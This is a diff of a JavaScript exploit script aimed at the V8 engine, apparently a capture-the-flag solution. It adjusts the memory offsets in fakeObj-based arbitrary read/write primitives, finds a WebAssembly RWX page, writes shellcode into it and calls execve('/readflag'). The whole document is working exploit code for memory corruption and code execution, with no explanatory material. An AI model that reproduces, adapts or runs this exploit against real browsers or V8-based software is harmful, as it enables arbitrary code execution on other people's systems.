@@ -53,7 +53,7 @@ function arb_read(addr) {
         addr += 1n;
 
     let fake = fakeObj(addrOf(arb_rw_arr) - 0x20n);
-    arb_rw_arr[1] = itof(0x8n << 32n) + itof(addr - 0x10n);
+    arb_rw_arr[1] = itof(0x8n << 32n) + itof(addr - 0x8n);
     return ftoi(fake[0]);
 }
 
@@ -62,7 +62,7 @@ function arb_write(addr, val) {
         addr += 1n;
 
     let fake = fakeObj(addrOf(arb_rw_arr) - 0x20n);
-    arb_rw_arr[1] = itof(0x8n << 32n) + itof(addr - 0x10n);
+    arb_rw_arr[1] = itof(0x8n << 32n) + itof(addr - 0x8n);
     fake[0] = itof(val);
 }
 
@@ -71,9 +71,9 @@ var wasm_mod = new WebAssembly.Module(wasm_code);
 var wasm_instance = new WebAssembly.Instance(wasm_mod);
 var f = wasm_instance.exports.main;
 
-var wasm_trusted_data = arb_read(addrOf(wasm_instance) + 0x10n) >> 32n;
+var wasm_trusted_data = arb_read(addrOf(wasm_instance) + 0x8n) >> 32n;
 console.log("[+] trusted data: 0x" + wasm_trusted_data.toString(16));
-var rwx = arb_read(wasm_trusted_data + 0x38n);
+var rwx = arb_read(wasm_trusted_data + 0x30n);
 console.log("[*] rwx: 0x" + rwx.toString(16));
 
 var shellcode = [
@@ -83,23 +83,19 @@ var shellcode = [
     0x0067616c6664n,
 ];
 
-let fake = fakeObj(addrOf(arb_rw_arr) - 0x20n);
-arb_rw_arr[1] = itof(0x8n << 32n) + itof(rwx - 0x10n);
-console.log("[*] fake: " + addrOf(fake).toString(16)); 
-
-function copy_shellcode(addr, shellcode) {
+function copy(addr, data_arr) {
     let buf = new ArrayBuffer(0x100);
     let dataview = new DataView(buf);
     let buf_addr = addrOf(buf);
-    let backing_store_addr = buf_addr - 1n + 0x2cn;
+    let backing_store_addr = buf_addr - 1n + 0x24n;
     arb_write(backing_store_addr, addr);
 
-    for (let i = 0; i < shellcode.length; i++) {
-        dataview.setBigUint64(8*i, shellcode[i], true);
+    for (let i = 0; i < data_arr.length; i++) {
+        dataview.setBigUint64(8*i, data_arr[i], true);
     }
 }
 
-copy_shellcode(rwx, shellcode);
+copy(rwx, shellcode);
 
 console.log("[+] executing execve('/readflag', 0, 0)");
 f();
